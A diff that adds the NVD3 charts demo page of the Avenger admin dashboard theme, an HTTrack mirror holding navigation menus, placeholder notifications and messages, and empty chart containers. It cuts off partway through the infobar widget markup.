@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from avenger.kaijuthemes.com/charts-nvd3.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 31 Oct 2015 15:03:42 GMT -->
+<head>
+    <meta charset="utf-8">
+    <title>Avenger Admin Theme</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+    <meta name="description" content="Avenger Admin Theme">
+    <meta name="author" content="KaijuThemes">
+
+    <link href='http://fonts.googleapis.com/css?family=RobotoDraft:300,400,400italic,500,700' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,600,700' rel='stylesheet' type='text/css'>
+
+    <!--[if lt IE 10]>
+        <script src="assets/js/media.match.min.js"></script>
+        <script src="assets/js/placeholder.min.js"></script>
+    <![endif]-->
+
+    <link href="assets/fonts/font-awesome/css/font-awesome.min.css" type="text/css" rel="stylesheet">        <!-- Font Awesome -->
+    <link href="assets/css/styles.css" type="text/css" rel="stylesheet">                                     <!-- Core CSS with all styles -->
+
+    <link href="assets/plugins/jstree/dist/themes/avenger/style.min.css" type="text/css" rel="stylesheet">    <!-- jsTree -->
+    <link href="assets/plugins/codeprettifier/prettify.css" type="text/css" rel="stylesheet">                <!-- Code Prettifier -->
+    <link href="assets/plugins/iCheck/skins/minimal/blue.css" type="text/css" rel="stylesheet">              <!-- iCheck -->
+
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries. Placeholdr.js enables the placeholder attribute -->
+    <!--[if lt IE 9]>
+        <link href="assets/css/ie8.css" type="text/css" rel="stylesheet">
+        <script type="text/javascript" src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.1.0/respond.min.js"></script>
+        <script type="text/javascript" src="assets/plugins/charts-flot/excanvas.min.js"></script>
+        <script type="text/javascript" src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- The following CSS are included as plugins and can be removed if unused-->
+    
+<link href="assets/plugins/nvd3/nv.d3.min.css" type="text/css" rel="stylesheet"> 		<!-- nvd3 -->
+
+    </head>
+
+    <body class="infobar-offcanvas">
+        
+        <div id="headerbar">
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-xs-6 col-sm-2">
+				<a href="#" class="shortcut-tile tile-brown">
+					<div class="tile-body">
+						<div class="pull-left"><i class="fa fa-pencil"></i></div>
+					</div>
+					<div class="tile-footer">
+						Create Post
+					</div>
+				</a>
+			</div>
+			<div class="col-xs-6 col-sm-2">
+				<a href="#" class="shortcut-tile tile-grape">
+					<div class="tile-body">
+						<div class="pull-left"><i class="fa fa-group"></i></div>
+						<div class="pull-right"><span class="badge">2</span></div>
+					</div>
+					<div class="tile-footer">
+						Contacts
+					</div>
+				</a>
+			</div>
+			<div class="col-xs-6 col-sm-2">
+				<a href="#" class="shortcut-tile tile-primary">
+					<div class="tile-body">
+						<div class="pull-left"><i class="fa fa-envelope-o"></i></div>
+						<div class="pull-right"><span class="badge">10</span></div>
+					</div>
+					<div class="tile-footer">
+						Messages
+					</div>
+				</a>
+			</div>
+			<div class="col-xs-6 col-sm-2">
+				<a href="#" class="shortcut-tile tile-inverse">
+					<div class="tile-body">
+						<div class="pull-left"><i class="fa fa-camera"></i></div>
+						<div class="pull-right"><span class="badge">3</span></div>
+					</div>
+					<div class="tile-footer">
+						Gallery
+					</div>
+				</a>
+			</div>
+
+			<div class="col-xs-6 col-sm-2">
+				<a href="#" class="shortcut-tile tile-midnightblue">
+					<div class="tile-body">
+						<div class="pull-left"><i class="fa fa-cog"></i></div>
+					</div>
+					<div class="tile-footer">
+						Settings
+					</div>
+				</a>
+			</div>
+			<div class="col-xs-6 col-sm-2">
+				<a href="#" class="shortcut-tile tile-orange">
+					<div class="tile-body">
+						<div class="pull-left"><i class="fa fa-wrench"></i></div>
+					</div>
+					<div class="tile-footer">
+						Plugins
+					</div>
+				</a>
+			</div>
+		</div>
+	</div>
+</div>
+        <header id="topnav" class="navbar navbar-midnightblue navbar-fixed-top clearfix" role="banner">
+
+	<span id="trigger-sidebar" class="toolbar-trigger toolbar-icon-bg">
+		<a data-toggle="tooltips" data-placement="right" title="Toggle Sidebar"><span class="icon-bg"><i class="fa fa-fw fa-bars"></i></span></a>
+	</span>
+
+	<a class="navbar-brand" href="index-2.html">Avenger</a>
+
+	<span id="trigger-infobar" class="toolbar-trigger toolbar-icon-bg">
+		<a data-toggle="tooltips" data-placement="left" title="Toggle Infobar"><span class="icon-bg"><i class="fa fa-fw fa-bars"></i></span></a>
+	</span>
+	
+	
+	<div class="yamm navbar-left navbar-collapse collapse in">
+		<ul class="nav navbar-nav">
+			<li class="dropdown">
+				<a href="#" class="dropdown-toggle" data-toggle="dropdown">Megamenu<span class="caret"></span></a>
+				<ul class="dropdown-menu" style="width: 900px;">
+					<li>
+						<div class="yamm-content container-sm-height">
+							<div class="row row-sm-height yamm-col-bordered">
+								<div class="col-sm-3 col-sm-height yamm-col">
+                                            
+                                    <h3 class="yamm-category">Sidebar</h3>
+                                    <ul class="list-unstyled mb20">
+                                        <li><a href="layout-fixed-sidebars.html">Stretch Sidebars</a></li>
+                                        <li><a href="layout-sidebar-scroll.html">Scroll Sidebar</a></li>
+                                        <li><a href="layout-static-leftbar.html">Static Sidebar</a></li>
+                                        <li><a href="layout-leftbar-widgets.html">Sidebar Widgets</a></li>   
+                                    </ul>
+
+                                    <h3 class="yamm-category">Infobar</h3>
+                                    <ul class="list-unstyled">
+                                        <li><a href="layout-infobar-offcanvas.html">Offcanvas Infobar</a></li>
+                                        <li><a href="layout-infobar-overlay.html">Overlay Infobar</a></li>
+                                        <li><a href="layout-chatbar-overlay.html">Chatbar</a></li>
+                                        <li><a href="layout-rightbar-widgets.html">Infobar Widgets</a></li>   
+                                    </ul>
+                                    
+                                </div>
+                                <div class="col-sm-3 col-sm-height yamm-col">
+                                    
+                                    <h3 class="yamm-category">Page Content</h3>
+                                    <ul class="list-unstyled mb20">
+                                        <li><a href="layout-breadcrumb-top.html">Breadcrumbs on Top</a></li>
+                                        <li><a href="layout-page-tabs.html">Page Tabs</a></li>
+                                        <li><a href="layout-fullheight-panel.html">Full-Height Panel</a></li>
+                                        <li><a href="layout-fullheight-content.html">Full-Height Content</a></li>
+                                    </ul>
+
+                                    <h3 class="yamm-category">Misc</h3>
+                                    <ul class="list-unstyled">
+                                    	<li><a href="layout-topnav-options.html">Topnav Options</a></li>
+                                        <li><a href="layout-horizontal-small.html">Horizontal Small</a></li>
+                                        <li><a href="layout-horizontal-large.html">Horizontal Large</a></li>
+                                        <li><a href="layout-boxed.html">Boxed</a></li>
+                                    </ul>
+                                    
+                                </div>
+                                <div class="col-sm-3 col-sm-height yamm-col">
+                                    
+                                    <h3 class="yamm-category">Analytics</h3>
+                                    <ul class="list-unstyled mb20">
+                                        <li><a href="charts-flot.html">Flot</a></li>
+                                        <li><a href="charts-sparklines.html">Sparklines</a></li>
+                                        <li><a href="charts-morris.html">Morris</a></li>
+                                        <li><a href="charts-easypiechart.html">Easy Pie Charts</a></li>
+                                    </ul>
+
+                                    <h3 class="yamm-category">Components</h3>
+                                    <ul class="list-unstyled">
+                                        <li><a href="ui-tiles.html">Tiles</a></li>
+                                        <li><a href="custom-knob.html">jQuery Knob</a></li>
+                                        <li><a href="custom-jqueryui.html">jQuery Slider</a></li>
+                                        <li><a href="custom-ionrange.html">Ion Range Slider</a></li>
+                                    </ul>
+                                    
+                                </div>
+                                <div class="col-sm-3 col-sm-height yamm-col">
+                                	<h3 class="yamm-category">Rem</h3>
+                                    <img src="assets/demo/stockphoto/communication_12_carousel.jpg" class="mb20 img-responsive" style="width: 100%;">
+                                    <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium. totam rem aperiam eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo.</p>
+                                </div>
+							</div>
+						</div>
+					</li>
+				</ul>
+			</li>
+			<li class="dropdown" id="widget-classicmenu">
+              <a href="#" class="dropdown-toggle" data-toggle="dropdown">Dropdown<span class="caret"></span></a>
+              <ul class="dropdown-menu" role="menu">
+                <li><a href="#">Action</a></li>
+                <li><a href="#">Another action</a></li>
+                <li><a href="#">Something else here</a></li>
+                <li class="divider"></li>
+                <li><a href="#">Separated link</a></li>
+                <li class="divider"></li>
+                <li><a href="#">One more separated link</a></li>
+              </ul>
+            </li>
+			<li><a href="#" target="_blank">Link</a></li>
+			<li><a href="#" target="_blank">Another Link</a></li>
+		</ul>
+	</div>
+
+	<ul class="nav navbar-nav toolbar pull-right">
+		<li class="dropdown toolbar-icon-bg">
+			<a href="#" id="navbar-links-toggle" data-toggle="collapse" data-target="header>.navbar-collapse">
+				<span class="icon-bg">
+					<i class="fa fa-fw fa-ellipsis-h"></i>
+				</span>
+			</a>
+		</li>
+
+		<li class="dropdown toolbar-icon-bg demo-search-hidden">
+			<a href="#" class="dropdown-toggle tooltips" data-toggle="dropdown"><span class="icon-bg"><i class="fa fa-fw fa-search"></i></span></a>
+			
+			<div class="dropdown-menu dropdown-alternate arrow search dropdown-menu-form">
+				<div class="dd-header">
+					<span>Search</span>
+					<span><a href="#">Advanced search</a></span>
+				</div>
+				<div class="input-group">
+					<input type="text" class="form-control" placeholder="">
+					
+					<span class="input-group-btn">
+						
+						<a class="btn btn-primary" href="#">Search</a>
+					</span>
+				</div>
+			</div>
+		</li>
+
+		<li class="toolbar-icon-bg demo-headerdrop-hidden">
+            <a href="#" id="headerbardropdown"><span class="icon-bg"><i class="fa fa-fw fa-level-down"></i></span></i></a>
+        </li>
+
+        <li class="toolbar-icon-bg hidden-xs" id="trigger-fullscreen">
+            <a href="#" class="toggle-fullscreen"><span class="icon-bg"><i class="fa fa-fw fa-arrows-alt"></i></span></i></a>
+        </li>
+
+		
+		<li class="dropdown toolbar-icon-bg">
+			<a href="#" class="hasnotifications dropdown-toggle" data-toggle='dropdown'><span class="icon-bg"><i class="fa fa-fw fa-bell"></i></span><span class="badge badge-info">5</span></a>
+			<div class="dropdown-menu dropdown-alternate notifications arrow">
+				<div class="dd-header">
+					<span>Notifications</span>
+					<span><a href="#">Settings</a></span>
+				</div>
+				<div class="scrollthis scroll-pane">
+					<ul class="scroll-content">
+
+						<li class="">
+							<a href="#" class="notification-info">
+								<div class="notification-icon"><i class="fa fa-user fa-fw"></i></div>
+								<div class="notification-content">Profile Page has been updated</div>
+								<div class="notification-time">2m</div>
+							</a>
+						</li>
+						<li class="">
+							<a href="#" class="notification-success">
+								<div class="notification-icon"><i class="fa fa-check fa-fw"></i></div>
+								<div class="notification-content">Updates pushed successfully</div>
+								<div class="notification-time">12m</div>
+							</a>
+						</li>
+						<li class="">
+							<a href="#" class="notification-primary">
+								<div class="notification-icon"><i class="fa fa-users fa-fw"></i></div>
+								<div class="notification-content">New users request to join</div>
+								<div class="notification-time">35m</div>
+							</a>
+						</li>
+						<li class="">
+							<a href="#" class="notification-danger">
+								<div class="notification-icon"><i class="fa fa-shopping-cart fa-fw"></i></div>
+								<div class="notification-content">More orders are pending</div>
+								<div class="notification-time">11h</div>
+							</a>
+						</li>
+						<li class="">
+							<a href="#" class="notification-primary">
+								<div class="notification-icon"><i class="fa fa-arrow-up fa-fw"></i></div>
+								<div class="notification-content">Pending Membership approval</div>
+								<div class="notification-time">2d</div>
+							</a>
+						</li>
+						<li class="">
+							<a href="#" class="notification-info">
+								<div class="notification-icon"><i class="fa fa-check fa-fw"></i></div>
+								<div class="notification-content">Succesfully updated to version 1.0.1</div>
+								<div class="notification-time">40m</div>
+							</a>
+						</li>
+					</ul>
+				</div>
+				<div class="dd-footer">
+					<a href="#">View all notifications</a>
+				</div>
+			</div>
+		</li>
+
+		<li class="dropdown toolbar-icon-bg hidden-xs">
+			<a href="#" class="hasnotifications dropdown-toggle" data-toggle='dropdown'><span class="icon-bg"><i class="fa fa-fw fa-envelope"></i></span></a>
+			<div class="dropdown-menu dropdown-alternate messages arrow">
+				<div class="dd-header">
+					<span>Messages</span>
+					<span><a href="#">Settings</a></span>
+				</div>
+
+				<div class="scrollthis scroll-pane">
+					<ul class="scroll-content">
+						<li class="">
+							<a href="#">
+								<img class="msg-avatar" src="assets/demo/avatar/avatar_09.png" alt="avatar" />
+								<div class="msg-content">
+									<span class="name">Steven Shipe</span>
+									<span class="msg">Nonummy nibh epismod lorem ipsum</span>
+								</div>
+								<span class="msg-time">30s</span>
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								<img class="msg-avatar" src="assets/demo/avatar/avatar_01.png" alt="avatar" />
+								<div class="msg-content">
+									<span class="name">Roxann Hollingworth <i class="fa fa-paperclip attachment"></i></span>
+									<span class="msg">Lorem ipsum dolor sit amet consectetur adipisicing elit</span>
+								</div>
+								<span class="msg-time">5m</span>
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								<img class="msg-avatar" src="assets/demo/avatar/avatar_05.png" alt="avatar" />
+								<div class="msg-content">
+									<span class="name">Diamond Harlands</span>
+									<span class="msg">:)</span>
+								</div>
+								<span class="msg-time">3h</span>
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								<img class="msg-avatar" src="assets/demo/avatar/avatar_02.png" alt="avatar" />
+								<div class="msg-content">
+									<span class="name">Michael Serio <i class="fa fa-paperclip attachment"></i></span>
+									<span class="msg">Sed distinctio dolores fuga molestiae modi?</span>
+								</div>
+								<span class="msg-time">12h</span>
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								<img class="msg-avatar" src="assets/demo/avatar/avatar_03.png" alt="avatar" />
+								<div class="msg-content">
+									<span class="name">Matt Jones</span>
+									<span class="msg">Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et mole</span>
+								</div>
+								<span class="msg-time">2d</span>
+							</a>
+						</li>
+						<li>
+							<a href="#">
+								<img class="msg-avatar" src="assets/demo/avatar/avatar_07.png" alt="avatar" />
+								<div class="msg-content">
+									<span class="name">John Doe</span>
+									<span class="msg">Neque porro quisquam est qui dolorem</span>
+								</div>
+								<span class="msg-time">7d</span>
+							</a>
+						</li>
+					</ul>
+				</div>
+
+				<div class="dd-footer"><a href="#">View all messages</a></div>
+			</div>
+		</li>
+
+		
+
+		<li class="dropdown toolbar-icon-bg">
+			<a href="#" class="dropdown-toggle" data-toggle='dropdown'><span class="icon-bg"><i class="fa fa-fw fa-user"></i></span></a>
+			<ul class="dropdown-menu userinfo arrow">
+				<li><a href="#"><span class="pull-left">Profile</span> <span class="badge badge-info">80%</span></a></li>
+				<li><a href="#"><span class="pull-left">Account</span> <i class="pull-right fa fa-user"></i></a></li>
+				<li><a href="#"><span class="pull-left">Settings</span> <i class="pull-right fa fa-cog"></i></a></li>
+				<li class="divider"></li>
+				<li><a href="#"><span class="pull-left">Earnings</span> <i class="pull-right fa fa-line-chart"></i></a></li>
+				<li><a href="#"><span class="pull-left">Statement</span> <i class="pull-right fa fa-list-alt"></i></a></li>
+				<li><a href="#"><span class="pull-left">Withdrawals</span> <i class="pull-right fa fa-dollar"></i></a></li>
+				<li class="divider"></li>
+				<li><a href="#"><span class="pull-left">Sign Out</span> <i class="pull-right fa fa-sign-out"></i></a></li>
+			</ul>
+		</li>
+
+	</ul>
+
+</header>
+
+        <div id="wrapper">
+            <div id="layout-static">
+                <div class="static-sidebar-wrapper sidebar-midnightblue">
+                    <div class="static-sidebar">
+                        <div class="sidebar">
+    <div class="widget stay-on-collapse" id="widget-welcomebox">
+        <div class="widget-body welcome-box tabular">
+            <div class="tabular-row">
+                <div class="tabular-cell welcome-avatar">
+                    <a href="#"><img src="assets/demo/avatar/avatar_02.png" class="avatar"></a>
+                </div>
+                <div class="tabular-cell welcome-options">
+                    <span class="welcome-text">Welcome,</span>
+                    <a href="#" class="name">Jonathan Smith</a>
+                </div>
+            </div>
+        </div>
+    </div>
+	<div class="widget stay-on-collapse" id="widget-sidebar">
+        <nav role="navigation" class="widget-body">
+	<ul class="acc-menu">
+		<li class="nav-separator">Explore</li>
+		<li><a href="index-2.html"><i class="fa fa-home"></i><span>Dashboard</span></a></li>
+		<!-- <li><a href="javascript:;"><i class="fa fa-user"></i><span>More Dashboard Pages</span></a>
+			<ul class="acc-menu">
+				<li><a href="sales-force.html">Sales Force</a></li>
+				<li><a href="sales-performance.html">Sales Performance</a></li>
+				<li><a href="kpi-dashboard.html">KPI Dashboard</a></li>
+				<li><a href="shipping-status.html">Shipping Status</a></li>
+				<li><a href="metrics-dashboard.html">Metrics Dashboard</a></li>
+			</ul>
+		</li> -->
+		<li><a href="javascript:;"><i class="fa fa-columns"></i><span>Layouts</span><span class="badge badge-primary">8</span></a>
+			<ul class="acc-menu">
+				<li><a href="layout-grids.html">Grid Scaffolding</a></li>
+
+				<li><a href="layout-fixed-sidebars.html">Stretch Sidebars</a></li>
+
+				<li><a href="layout-sidebar-scroll.html">Sidebar Scroll</a></li>
+				<li><a href="layout-static-leftbar.html">Static Sidebar</a></li>
+
+				<li><a href="layout-infobar-offcanvas.html">Offcanvas Infobar</a></li>
+				<li><a href="layout-infobar-overlay.html">Overlay Infobar</a></li>
+
+				<li><a href="layout-page-tabs.html">Page Tabs</a></li>
+
+				<li><a href="layout-fullheight-content.html">Fixed Height Content</a></li>
+				<li><a href="layout-fullheight-panel.html">Fixed Height Panel</a></li>
+
+				<li><a href="layout-leftbar-widgets.html">Leftbar Widgets <span class="label label-grape">Cool</span></a></li>
+				<li><a href="layout-rightbar-widgets.html">Rightbar Widgets <span class="label label-grape">Cool</span></a></li>
+				<li><a href="layout-topnav-options.html">Topnav Options</a></li>
+
+				<li><a href="javascript:;">Horizontal Nav <span class="badge badge-dark">2</span></a>
+					<ul class="acc-menu">
+						<li><a href="layout-horizontal-small.html">Small Menu</a></li>
+						<li><a href="layout-horizontal-large.html">Large Menu</a></li>
+					</ul>
+				</li>
+
+				<li><a href="layout-chatbar-overlay.html">Chatbar</a></li>
+				<li><a href="layout-boxed.html">Boxed</a></li>
+				<li><a href="layout-compact.html">Compact Leftbar</a></li>
+				
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-flask"></i><span>Base Styles</span></a>
+			<ul class="acc-menu">
+				<li><a href="ui-typography.html">Typography</a></li>
+				<li><a href="ui-buttons.html">Buttons</a></li>
+				<li><a href="ui-tables.html">Tables</a></li>
+				<li><a href="ui-forms.html">Forms</a></li>
+				<li><a href="ui-images.html">Images</a></li>
+				<li><a href="ui-panels.html">Panels</a></li>
+				<li><a href="ui-icons.html">Font Icons</a></li>
+				<li><a href="ui-helpers.html">Helpers</a></li>
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-cogs"></i><span>Bootstrap</span><span class="label label-info">UI</span></a>
+            <ul class="acc-menu">
+                <li><a href="ui-modals.html">Modal Box</a></li>
+                <li><a href="ui-progress.html">Progress Bars</a></li>
+				<li><a href="ui-paginations.html">Pagers &amp; Paginations</a></li>
+				<li><a href="ui-breadcrumbs.html">Breadcrumbs</a></li>
+				<li><a href="ui-labelsbadges.html">Labels &amp; Badges</a></li>
+                <li><a href="ui-alerts.html">Alerts &amp; Notificiations</a></li>
+                <li><a href="ui-tabs.html">Tabs &amp; Accordions</a></li>
+                
+                <li><a href="ui-carousel.html">Carousel</a></li>
+                <li><a href="ui-wells.html">Wells</a></li>
+            </ul>
+        </li>
+
+		<li class="nav-separator">Plugins</li>
+         <li><a href="javascript:;"><i class="fa fa-random"></i><span>Components</span></a>
+        	<ul class="acc-menu">
+        		<li><a href="ui-tiles.html">Tiles</a></li>
+        		<li><a href="custom-skylo.html">Page Progress Bar</a></li>
+        		<li><a href="custom-bootbox.html">Bootbox</a></li>
+        		<li><a href="custom-datepaginator.html">Date Paginator</a></li>
+        		<li><a href="custom-pines.html">Pines Notification</a></li>
+        		<li><a href="custom-notific8.html">Notific8 Notification</a></li>
+        		<li><a href="custom-pulsate.html">Pulsating Elements</a></li>
+				<li><a href="custom-knob.html">jQuery Knob</a></li>
+				<li><a href="custom-jqueryui.html">jQueryUI Widgets</a></li>
+				<li><a href="custom-ionrange.html">Ion Range Slider</a></li>
+				<li><a href="custom-tour.html">Tour</a></li>
+				<li><a href="ui-nestable.html">Nestable Lists</a></li>
+				<li><a href="custom-jstree.html">Tree View</a></li>
+				<li><a href="custom-weather.html">Weather</a></li>
+        	</ul>
+        </li>
+		<li><a href="javascript:;"><i class="fa fa-pencil"></i><span>Forms</span></a>
+			<ul class="acc-menu">
+				<li><a href="form-components.html">Form Components</a></li>
+				<li><a href="form-pickers.html">Pickers</a></li>
+				<li><a href="form-wizard.html">Form Wizard</a></li>
+				<li><a href="form-validation.html">Form Validation</a></li>
+				<li><a href="form-masks.html">Form Masks</a></li>
+				<li><a href="form-dropzone.html">Dropzone Uploader</a></li>
+				<li><a href="form-ckeditor.html">CKEditor</a></li>
+				<li><a href="form-summernote.html">Summernote</a></li>
+				<li><a href="form-markdown.html">Markdown Editor</a></li>
+				<li><a href="form-xeditable.html">Inline Editor</a></li>
+				<li><a href="form-imagecrop.html">Image Cropping</a></li>
+				<li><a href="form-gridforms.html">Grid Forms</a></li>
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-table"></i><span>Tables</span></a>
+			<ul class="acc-menu">
+				<li><a href="tables-responsive.html">Responsive Tables</a></li>
+				<li><a href="tables-editable.html">Editable Tables</a></li>
+				<li><a href="tables-data.html">Data Tables</a></li>
+				<li><a href="tables-advanceddatatable.html">Advanced Data Tables</a></li>
+				<li><a href="tables-fixedheader.html">Fixed Header Tables</a></li>
+			</ul>
+		</li>
+		<li><a href="ui-advancedpanels.html"><i class="fa fa-cog fa-spin"></i><span>Panels</span><span class="label label-alizarin">HOT!</span></a></li>
+		<li><a href="javascript:;"><i class="fa fa-bar-chart-o"></i><span>Analytics</span></a>
+			<ul class="acc-menu">
+				<li><a href="charts-flot.html">Flot</a></li>
+				<li><a href="charts-sparklines.html">Sparklines</a></li>
+				<li><a href="charts-morris.html">Morris.js</a></li>
+				<li><a href="charts-chart.html">Chart.js</a></li>
+				<li><a href="charts-easypiechart.html">Easy Pie Chart</a></li>
+				<li><a href="charts-nvd3.html">nvd3 <span class="label label-info">New</span></a></li>
+				<li><a href="charts-gantt.html">Gantt Chart</a></li>
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-map-marker"></i><span>Maps</span></a>
+			<ul class="acc-menu">
+				<li><a href="maps-google.html">Google Maps</a></li>
+				<li><a href="maps-vector.html">Vector Maps</a></li>
+				<li><a href="maps-mapael.html">Mapael</a></li>
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-files-o"></i><span>Pages</span></a>
+			<ul class="acc-menu">
+				<li><a href="extras-messages.html">Messages</a></li>
+				<li><a href="extras-profile.html">Profile</a></li>
+				<li><a href="extras-calendar.html">Calendar</a></li>
+				<li><a href="extras-timeline.html">Timeline</a></li>
+				<li><a href="extras-search.html">Search Page</a></li>
+				<li><a href="extras-chatroom.html">Chat Room</a></li>
+				<li><a href="extras-invoice.html">Invoice</a></li>
+				<li><a href="javascript:;">Responsive Email Template</a>
+					<ul class="acc-menu">
+						<li><a href="responsive-email/basic.html">Basic</a></li>
+						<li><a href="responsive-email/hero.html">Hero</a></li>
+						<li><a href="responsive-email/sidebar.html">Sidebar</a></li>
+						<li><a href="responsive-email/sidebar-hero.html">Sidebar Hero</a></li>
+					</ul>
+				</li>
+				<li><a href="extras-gallery.html">Gallery</a></li>
+				<li><a href="coming-soon.html">Coming Soon</a></li>
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-briefcase"></i><span>Extras</span></a>
+			<ul class="acc-menu">
+				<li><a href="extras-pricingtable.html">Pricing Tables</a></li>
+				<li><a href="extras-faq.html">FAQ</a></li>
+				<li><a href="extras-registration.html">Registration</a></li>
+				<li><a href="extras-forgotpassword.html">Password Reset</a></li>
+				<li><a href="extras-login.html">Login</a></li>
+				<li><a href="extras-404.html">404 Page</a></li>
+				<li><a href="extras-500.html">500 Page</a></li>
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-sitemap"></i><span>Multiple Levels</span><span class="badge badge-dark">99</span></a>
+			<ul class="acc-menu">
+				<li><a href="javascript:;">Menu Item 1</a></li>
+				<li><a href="javascript:;">Menu Item 2</a>
+					<ul class="acc-menu">
+						<li><a href="javascript:;">Menu Item 2.1</a></li>
+						<li><a href="javascript:;">Menu Item 2.2</a>
+							<ul class="acc-menu">
+								<li><a href="javascript:;">Menu Item 2.2.1</a></li>
+								<li><a href="javascript:;">Menu Item 2.2.2</a>
+									<ul class="acc-menu">
+										<li><a href="javascript:;">And deeper yet!</a></li>
+									</ul>
+								</li>
+							</ul>
+						</li>
+					</ul>
+				</li>
+				<li class="disabled-link"><a href="index-2.html">Disabled Menu Item</a></li>
+			</ul>
+		</li>
+
+		<li class="nav-separator">Functional Apps</li>
+		<li><a href="app-inbox.html"><i class="fa fa-inbox"></i><span>Inbox</span><span class="badge badge-success">3</span></a></li>
+		<li><a href="app-tasks.html"><i class="fa fa-tasks"></i><span>Tasks</span><span class="badge badge-info">7</span></a></li>
+		<li><a href="app-notes.html"><i class="fa fa-pencil-square-o"></i><span>Notes</span></a></li>
+		<li><a href="app-todo.html"><i class="fa fa-check"></i><span>Todo</span><span class="badge badge-dark">10</span></a></li>
+
+		<li class="nav-separator">Templates</li>
+		<li><a href="javascript:;"><i class="fa fa-coffee"></i><span>Blog</span></a>
+			<ul class="acc-menu">
+				<!-- <li><a href="app-blog-dashboard.html">Dashboard</a></li> -->
+				<li><a href="app-blog-page-list.html">Page List</a></li>
+				<li><a href="app-blog-edit.html">Page Edit</a></li>
+				<li><a href="app-blog-comment.html">Comment Moderation</a></li>
+				<li><a href="javascript:;">Blog Front</a>
+					<ul class="acc-menu">
+						<li><a href="app-blogfront-list.html">Blog Page</a></li>
+						<li><a href="app-blogfront-page.html">Blog Post</a></li>
+						<li><a href="app-blogfront-column.html">Blog Column</a></li>
+						<li><a href="app-blogfront-portfolio.html">Porfolio</a></li>
+					</ul>
+				</li>
+
+				
+			</ul>
+		</li>
+		<li><a href="javascript:;"><i class="fa fa-shopping-cart"></i><span>eCommerce</span></a>
+			<ul class="acc-menu">
+				<!-- <li><a href="app-ecommerce-dashboard.html">Dashboard</a></li> -->
+				<!-- <li><a href="app-ecommerce-order-list.html">Order List</a></li>
+				<li><a href="app-ecommerce-order-details.html">Order Details</a></li> -->
+				<li><a href="app-ecommerce-product-list.html">Product List</a></li>
+				<li><a href="app-ecommerce-product-edit.html">Product Edit</a></li>
+				<li><a href="javascript:;">Store Front</a>
+					<ul class="acc-menu">
+						<li><a href="app-store-product-list.html">Product List</a></li>
+						<!-- <li><a href="app-store-product-column.html">Product Column</a></li> -->
+						<li><a href="app-store-product-details.html">Product Details</a></li>
+						<li><a href="app-store-shoppingcart.html">Shopping Cart</a></li>
+						<li><a href="app-store-checkout.html">Checkout</a></li>
+					</ul>
+				</li>
+			</ul>
+		</li>
+		
+	</ul>
+</nav>
+    </div>
+</div>
+                    </div>
+                </div>
+                <div class="static-content-wrapper">
+                    <div class="static-content">
+                        <div class="page-content">
+                            <ol class="breadcrumb">
+                                
+<li><a href="index-2.html">Home</a></li>
+<li><a href="#">Charts</a></li>
+<li class="active"><a href="charts-nvd3.html">NVD3</a></li>
+
+                            </ol>
+                            <div class="page-heading">            
+                                <h1>NVD3</h1>
+                                <div class="options">
+    <div class="btn-toolbar">
+        <a href="#" class="btn btn-default"><i class="fa fa-fw fa-wrench"></i></a>
+    </div>
+</div>
+                            </div>
+                            <div class="container-fluid">
+                                
+
+<div class="row">
+	<div class="col-xs-12">
+		<div class="alert alert-info">
+			<h3>nvd3.js</h3>
+			<p>This project is an attempt to build re-usable charts and chart components for <a href="http://d3js.org/">d3.js</a> without taking away the power that d3.js gives you</p>
+		</div>
+	</div>
+	<div class="col-xs-12">
+		<div class="panel">
+			<div class="panel-heading">
+				<h2>Simple Line Chart</h2>
+			</div>
+			<div class="panel-body">
+				<div id='line'>
+				  <svg style='height:300px'> </svg>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="col-xs-12">
+		<div class="panel">
+			<div class="panel-heading">
+				<h2>Stacked/Grouped Multi-Bar Chart</h2>
+			</div>
+			<div class="panel-body">
+				<div id='stackedbar'>
+				  <svg style='height:300px'> </svg>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="row">
+	<div class="col-xs-12">
+		<div class="panel">
+			<div class="panel-heading">
+				<h2>Stacked Area Chart</h2>
+			</div>
+			<div class="panel-body">
+				<div id='stackedarea'>
+				  <svg style='height:300px'> </svg>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+                            </div> <!-- .container-fluid -->
+                        </div> <!-- #page-content -->
+                    </div>
+                    <footer role="contentinfo">
+    <div class="clearfix">
+        <ul class="list-unstyled list-inline pull-left">
+            <li><h6 style="margin: 0;"> &copy; 2015 Avenger</h6></li>
+        </ul>
+        <button class="pull-right btn btn-link btn-xs hidden-print" id="back-to-top"><i class="fa fa-arrow-up"></i></button>
+    </div>
+</footer>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="infobar-wrapper scroll-pane">
+            <div class="infobar scroll-content">
+
+    <div id="widgetarea">
+
+        <div class="widget" id="widget-sparkline">
+            <div class="widget-heading">
+                <a href="javascript:;" data-toggle="collapse" data-target="#sparklinestats"><h4>Sparkline Stats</h4></a>
